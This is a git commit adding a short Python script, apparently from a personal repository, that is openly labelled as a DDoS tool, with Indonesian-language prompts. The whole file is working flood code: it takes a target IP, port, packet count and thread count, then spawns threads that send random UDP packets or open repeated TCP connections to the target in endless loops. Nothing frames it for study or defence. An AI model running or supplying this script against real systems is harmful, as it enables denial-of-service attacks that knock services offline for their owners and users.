3e8a62419ebd216d3e6146530f8156b1ed955d75
VANS-02 <89282122+VANS-02@users.noreply.github.com>
2021-08-23 02:33:37 +0700

    Add files via upload

---
+++ Nibretxxx.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+#Code by Rence
+import random
+import socket
+import threading
+
+print ("DDOS By vans.Qc")
+print ("TOOLS hanya khusus untuk evans")
+print ("bismillah dulu ajee!!!")
+ip = str(input(" Tujuan Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket yang dikirim ke target:"))
+threads = int(input(" Threads yang dikirim:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[PAKET]","[TOK]","[TOK]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" PAKET BANG DARI EVANS!!! TOK TOK TOK!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[PAKET]","[TOK]","[TOK]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" PAKET BANG DARI EVANS!!! TOK TOK TOK!!!!")
+		except:
+			s.close()
+			print("[*] Error")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
